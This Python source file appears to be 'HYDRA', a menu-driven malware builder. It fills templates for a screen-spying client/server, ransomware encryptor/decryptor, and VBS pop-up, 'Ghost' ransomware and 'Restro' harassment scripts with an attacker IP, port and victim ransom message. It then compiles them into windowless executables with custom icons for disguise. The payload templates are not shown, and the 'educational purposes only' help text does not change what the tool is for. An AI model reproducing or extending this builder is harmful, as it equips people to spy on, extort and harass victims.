from itertools import cycle
import os
import shutil
import subprocess
import time
from colorama import Fore
import win32api
from itertools import cycle
from threading import Thread
from time import sleep
from sys import stdout as terminal

done = False

def animate():
    for c in cycle([Fore.LIGHTYELLOW_EX +'|',Fore.LIGHTYELLOW_EX + '/',Fore.LIGHTYELLOW_EX + '-',Fore.LIGHTYELLOW_EX + '\\']):
        if done:
            break
        terminal.write(Fore.LIGHTGREEN_EX + '\rloading ' + c)
        terminal.flush()
        sleep(0.1)
    terminal.flush()

t = Thread(target=animate)
t.start()
sleep(3)
done = True


os.system('cls' if os.name == 'nt' else 'clear')

print(Fore.LIGHTYELLOW_EX + "    V1" , Fore.GREEN + '''
   @@%                %@@
   *@%*_++++++++++++_*%@*
    @##      /\      ##@
    *@*   /\ %% /\    @*
    #@    #  %%  #    %%         %@              @@      **+         *#%+#*
    %#    @  %%  @    *@   @@    %@     *%*      @@     *@@%#*@      *@   @%*            %%
    %%    @  %%  @    #@   @@     @     *%*     #%      @@@    %@    *@    %*          @@@@
     @    @  %%  @    @    @@     @      +*@%  %%       @%     #@    *@    #*         @   @
      #    \@@##/   @*     %####@#@@++     %@@@        *@#    #@     *@@@@%@        @@@##%@%
       *%    %%    %#     #@     @#          @@         %@    @%     *@@*   %@      @*   *@
         %%  %%  #@       #@     @#          @@         @@@#*         *@      %@   %*     @
          @  %%  @*              #           @@                       *@        
          *@@@@@@*                                                    *%          
          *@@@@@@*                                                    *%
          *@@@@@@*                                                     %
           #@@@@#                                                                  
            +##+                                                                          LITE
''')

def show_menu():
    print("                                                  ")
    print(Fore.LIGHTYELLOW_EX + "BY ABD125141")
    print("                             ")
    print(Fore.LIGHTRED_EX + " ID",Fore.LIGHTYELLOW_EX   + "            VIRES NAME" , Fore.LIGHTCYAN_EX +   "                   RISK" , Fore.LIGHTMAGENTA_EX + "                 GOUL")
    print(Fore.GREEN + "----------------------------------------------------------------------------------")
    print(Fore.RED + "[ 1 ]", Fore.LIGHTYELLOW_EX + "    windows Screen Scam virus", Fore.LIGHTRED_EX + "        HIGHT" , Fore.LIGHTRED_EX + "                SPY" )
    print(Fore.RED + "[ 2 ]", Fore.LIGHTYELLOW_EX + "    Bad USB",Fore.RED+ "                            DEADLY", Fore.RED + "               RANSOM")
    print(Fore.RED + "[ 3 ]", Fore.LIGHTYELLOW_EX + "    Pop-Up",Fore.GREEN + "                             LOW ", Fore.GREEN + "                 HARASSMENT")
    print(Fore.RED + "[ 4 ]", Fore.LIGHTYELLOW_EX + "    Ghost", Fore.LIGHTRED_EX + "                              HIGHT", Fore.LIGHTRED_EX + "                RANSOMWARE")
    print(Fore.RED + "[ 5 ]", Fore.LIGHTYELLOW_EX + "    Restro", Fore.YELLOW + "                             MEDIUM", Fore.GREEN + "               HARASSMENT")
    print(Fore.RED + "[ 6 ]", Fore.LIGHTYELLOW_EX + "    HELP")
    print(Fore.RED + "[ 7 ]", Fore.LIGHTYELLOW_EX + "    Contact US for a problem")
    print(Fore.RED + "[ 0 ]", Fore.LIGHTYELLOW_EX + "    EXIT")
    print(Fore.LIGHTGREEN_EX + "-----------------------------------------------------------------------------------")
    print()

def modify_code(code_path, ip_address, port, mass , name ,is_client_code=False):
    with open(code_path, 'r', encoding='utf-8') as file:
        code = file.read()

    # Convert the port value to a string
    port_str = str(port)
    mass_str = str(mass)
    name_str = str(name)

    modified_code = code.replace('192.168.1.152', str(ip_address)).replace('5252', port_str).replace('hhhhhhhhhh' , mass_str).replace('Hacker1' , name_str)

    if is_client_code:
        modified_code = modified_code.replace('5252', port_str).replace('hhhhhhhhh', mass_str).replace('Hacker1' , name_str)


    modified_code_dir = os.path.join('output', os.path.dirname(code_path))
    modified_code_path = os.path.join(modified_code_dir, os.path.basename(code_path).replace('.py', '_ready.py'))

    os.makedirs(modified_code_dir, exist_ok=True)

    with open(modified_code_path, 'w', encoding='utf-8') as file:
        file.write(modified_code)

    return modified_code_path

def convert_to_executable(code_path, output_with_console, icon_path):
    if output_with_console:
        options = ['--onefile', '--icon=' + icon_path]
    else:
        options = ['--onefile', '--noconsole', '--icon=' + icon_path]

    subprocess.run(['pyinstaller'] + options + [code_path])


    exe_path = os.path.join('dist', os.path.splitext(os.path.basename(code_path))[0] + '.exe')
    set_icon(exe_path, icon_path)

def set_icon(exe_path, icon_path):
    icon_path = os.path.abspath(icon_path)

    try:
        win32api.SetConsoleIcon(icon_path)
        print(Fore.LIGHTGREEN_EX+"Icon set successfully.")
    except Exception as e:
        print(Fore.RED+"Failed to set icon:", str(e))

def main():
    while True:
        show_menu()
        choice = input(Fore.LIGHTWHITE_EX + "WDYW: ")
        print("      ")
        print(Fore.LIGHTRED_EX+"KEEP HACkING...")
        print("     ")
        time.sleep(1)

        if choice == '1':
            ip_address = input(Fore.LIGHTMAGENTA_EX + "IP: ")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print(f"{Fore.LIGHTWHITE_EX}IP Selected = {ip_address}")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print("        ")
            port = input(Fore.LIGHTGREEN_EX + "PORT: ")
            name = 1
            mass = 1
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print(f"{Fore.LIGHTWHITE_EX}PORT Selected = {port}")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print("     ")
            icon_path = input(Fore.LIGHTBLUE_EX + "Icon Path: ")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print(f"{Fore.LIGHTWHITE_EX}ICON Selected = {icon_path}")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print("    ")
            time.sleep(1)
            print(Fore.YELLOW+"We prepare everything for you , relax...")
            time.sleep(5)

            client_code_path = os.path.join('FILES', 'screen_c.py')
            modified_client_code_path = modify_code(client_code_path, ip_address, port, name , mass, is_client_code=True)
            convert_to_executable(modified_client_code_path, output_with_console=False, icon_path=icon_path)

            server_code_path = os.path.join('FILES', 'screen_s.py')
            modified_server_code_path = modify_code(server_code_path, ip_address,  port, name , mass)
            convert_to_executable(modified_server_code_path, output_with_console=True, icon_path=icon_path)

            print(Fore.LIGHTGREEN_EX + "virus Created Successfully")
            print()

            

        elif choice == '2':
            ip_address = input(Fore.LIGHTMAGENTA_EX + "Password (16 later,num) EX :" + Fore.LIGHTBLUE_EX + "P@ssw0rd1234AbCd:")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print(f"{Fore.LIGHTWHITE_EX}Password Selected = {ip_address}")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            port = 1
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            mass = input(Fore.LIGHTGREEN_EX + "Enter your message to the victim: ")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print(f"{Fore.LIGHTWHITE_EX}message Selected = {mass}")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            name = input(Fore.LIGHTGREEN_EX + "Whats your name? ")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print(f"{Fore.LIGHTWHITE_EX}Name Selected= {name}")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            icon_path = input(Fore.LIGHTBLUE_EX + "Icon Path: ")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print(f"{Fore.LIGHTWHITE_EX}ICON Selected = {icon_path}")
            print(Fore.LIGHTYELLOW_EX+"-----------------------------------")
            print("    ")
       
            time.sleep(1)
            print(Fore.YELLOW+"We prepare everything for you , relax...")
            time.sleep(5)
            
            client_code_path = os.path.join('FILES', 'ransom_enc.py')
            modified_client_code_path = modify_code(client_code_path, ip_address, port, name , mass, is_client_code=True)
            convert_to_executable(modified_client_code_path, output_with_console=False, icon_path=icon_path)

            server_code_path = os.path.join('FILES', 'ransom_dec.py')
            modified_server_code_path = modify_code(server_code_path, ip_address,  port, name , mass)
            convert_to_executable(modified_server_code_path, output_with_console=True, icon_path=icon_path)

            print(Fore.LIGHTGREEN_EX + "VIRUS Created Successfully")
            print()
            
            print(Fore.LIGHTGREEN_EX + "BAD USB Created Successfully")
            print()

        
        elif choice == '3':
            icon_path = 4
            print("    ")
            time.sleep(1)
            print(Fore.YELLOW + "We prepare everything for you, relax...")
            time.sleep(5)

            # مسار ملف الـ txt والـ vbs
            client_code_path = os.path.join('FILES', 'popup.txt')
            vbs_code_path = os.path.join('output', 'FILES', 'popup.vbs')

            try:
                # نسخ محتويات ملف الـ txt وحفظه في ملف الـ vbs
                shutil.copy(client_code_path, vbs_code_path)
                print(Fore.GREEN + "TXT File has been copied and saved as VBS successfully.")
            except Exception as e:
                print(Fore.RED + "Failed to copy TXT file as VBS:", str(e))

        
            print(Fore.GREEN + "VBS File has been created and saved successfully.") 
            print(Fore.LIGHTGREEN_EX + "virus Created Successfully")
            print() 
        elif choice == '4':
            icon_path = 4
            print("    ")
            time.sleep(1)
            print(Fore.YELLOW + "We prepare everything for you, relax...")
            time.sleep(5)

            # مسار ملف الـ txt والـ vbs
            client_code_path = os.path.join('FILES', 'ghost.txt')
            vbs_code_path = os.path.join('output', 'FILES', 'ghost.vbs')
            client_code_path2 = os.path.join('FILES', 'ghost_s.txt')
            vbs_code_path2 = os.path.join('output', 'FILES', 'ghost_s.vbs')

            try:
                # نسخ محتويات ملف الـ txt وحفظه في ملف الـ vbs
                shutil.copy(client_code_path, vbs_code_path)
                print(Fore.GREEN + "TXT File has been copied and saved as VBS successfully.")
            except Exception as e:
                print(Fore.RED + "Failed to copy TXT file as VBS:", str(e))

        
            print(Fore.GREEN + "VBS File has been created and saved successfully.") 
            print(Fore.LIGHTGREEN_EX + "virus Created Successfully")
            print() 

        elif choice == '5':
            icon_path = 4
            print("    ")
            time.sleep(1)
            print(Fore.YELLOW + "We prepare everything for you, relax...")
            time.sleep(5)

            # مسار ملف الـ txt والـ vbs
            client_code_path = os.path.join('FILES', 'Restro.txt')
            vbs_code_path = os.path.join('output', 'FILES', 'Restro.vbs')

            try:
                # نسخ محتويات ملف الـ txt وحفظه في ملف الـ vbs
                shutil.copy(client_code_path, vbs_code_path)
                print(Fore.GREEN + "TXT File has been copied and saved as VBS successfully.")
            except Exception as e:
                print(Fore.RED + "Failed to copy TXT file as VBS:", str(e))

        
            print(Fore.GREEN + "VBS File has been created and saved successfully.") 
            print(Fore.LIGHTGREEN_EX + "virus Created Successfully")
            print() 

# الخيار رقم 6 - HELP
        elif choice == '6':
            print(Fore.LIGHTBLUE_EX + "HELP:")
            print(Fore.LIGHTWHITE_EX + "-----")
            print(Fore.LIGHTRED_EX + "This program is designed for educational purposes only. It provides a menu of different Viruses and tools that can be used for security testing and awareness.")
            print(Fore.LIGHTRED_EX + "Each option corresponds to a different type of Viruses or tool.")
            print()
            print(Fore.LIGHTMAGENTA_EX + "Options:")
            print(Fore.LIGHTYELLOW_EX + "1. Windows Screen Scam virus: Creates a virus that simulates a screen scam on a Windows system.")
            print(Fore.LIGHTYELLOW_EX + "2. Bad USB: Generates a virus for a USB device that may act in a malicious way when connected to a computer.")
            print(Fore.LIGHTYELLOW_EX + "3. Pop-Up: Creates a simple pop-up virus.")
            print(Fore.LIGHTYELLOW_EX + "4. Ghost: Generates a virus that may act as ransomware.")
            print(Fore.LIGHTYELLOW_EX + "5. Restro: Creates a virus that may cause harassment.")
            print(Fore.LIGHTYELLOW_EX + "6. HELP: Displays this help message.")
            print(Fore.LIGHTYELLOW_EX + "7. Contact US for a problem: Provides contact information for support.")
            print(Fore.LIGHTYELLOW_EX + "0. EXIT: Exits the program.")
            print()
            print(Fore.LIGHTMAGENTA_EX + "Instructions:")
            print(Fore.GREEN + "1. Select the desired option by entering the corresponding number.")
            print(Fore.LIGHTCYAN_EX + "2. Follow the prompts to provide necessary information for the virus.")
            print(Fore.LIGHTGREEN_EX + "3. Wait for the program to prepare the virus.")
            print(Fore.CYAN + "4. The generated virus will be saved in the 'output' and 'dist' folder.")
            print(Fore.LIGHTRED_EX + "5. Use the generated viruses responsibly and only in controlled environments.")
            print(Fore.YELLOW + "6. The program will keep running until you choose to exit (option 0).")
            print()


        elif choice == '7':
            print(Fore.MAGENTA + "-------------------------------------------------")
            print(Fore.YELLOW + "Contact US for a problem at [a6291088@gmail.com]")
            print(Fore.MAGENTA + "-------------------------------------------------")


        elif choice == '0':
         break
        

        else:
            print(Fore.RED + "Invalid choice. Please select again.")

            

    print(Fore.BLUE + "@",Fore.LIGHTWHITE_EX + "HYDRA will miss you :(",Fore.BLUE + "@" , Fore.LIGHTGREEN_EX + " HYDRA©" , Fore.LIGHTYELLOW_EX + "Created by ABooD125141"  )
    print(Fore.BLUE + "_________________________")
    print("                     ")
    print(Fore.YELLOW + "hAcK tHe WoRLd ")
    print("                     ")
    print()

if __name__ == "__main__":
    main()
    time.sleep(3)